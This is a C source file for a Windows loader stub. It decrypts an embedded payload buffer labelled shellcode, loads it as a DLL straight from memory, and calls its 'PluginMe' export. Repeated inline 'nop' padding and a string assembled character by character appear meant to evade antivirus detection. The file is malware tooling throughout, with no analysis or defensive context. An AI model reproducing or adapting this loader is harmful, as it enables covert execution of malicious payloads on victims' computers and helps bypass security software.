#include "MemLoadDll.h"
#include "resource.h"
#include "ShellCode.h"
#include "head.h"

typedef int (WINAPI *PFN_POPMSGBOX)(void);

void EncryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)//Ω‚√‹
{
	unsigned long i;
	unsigned char p;
	
	p = (unsigned char ) key % 1451 + 61;
	
	for(i = 0; i < nLen; i++) 
	{
		*szRec ^= p;
		*szRec += p;
		szRec++;
	}
}

void LoadDllFromMemAndCall( const char *name)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	DWORD dwSize;
	PVOID DllResourceModule=NULL;
	HMEMORYMODULE hDll;
	PFN_POPMSGBOX pfn;
	
	__asm nop;
	__asm nop;
	
	EncryptData((unsigned char *)m_MyShellCodeFileBuf,m_MyShellCodeFileSize,1024);	

	__asm nop;
	__asm nop;

	hDll=MemoryLoadLibrary(m_MyShellCodeFileBuf);
	if (hDll==NULL)
		return ;
	pfn=MemoryGetProcAddress(hDll,name);
	if (pfn==NULL)
	{
		MemoryFreeLibrary(hDll);
		__asm nop;
		__asm nop;
		return;
	}
	pfn();
	if (hDll!=NULL)
	{
		__asm nop;
		__asm nop;
		MemoryFreeLibrary(hDll);
		hDll=NULL;
	}
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	// TODO: Place code here.
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	char xEiPW[] = {'P','l','u','g','i','n','M','e','\0'};
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	LoadDllFromMemAndCall(xEiPW);
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	_asm nop;
	return 0;
}
